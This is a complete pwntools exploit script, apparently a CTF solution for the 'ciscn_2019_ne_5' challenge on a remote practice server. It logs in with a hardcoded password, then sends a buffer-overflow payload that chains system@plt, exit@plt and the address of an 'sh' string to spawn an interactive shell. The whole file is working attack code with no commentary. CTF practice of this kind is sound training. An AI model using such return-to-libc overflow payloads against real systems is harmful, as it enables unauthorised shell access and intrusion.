from pwn import *

# io = process('ciscn_2019_ne_5')
io = remote('node4.buuoj.cn', 25316)
elf = ELF('ciscn_2019_ne_5')
system_plt = elf.plt['system']
exit_plt = elf.plt['exit']
sh_addr = 0x080482EA

io.sendlineafter('Please input admin password:', 'administrator')
io.sendlineafter('0.Exit\n:', '1')
payload = cyclic(0x4c) + p32(system_plt) + p32(exit_plt) + p32(sh_addr)
io.sendlineafter('Please input new log info:', payload)
io.sendlineafter('0.Exit\n:', '4')
io.interactive()

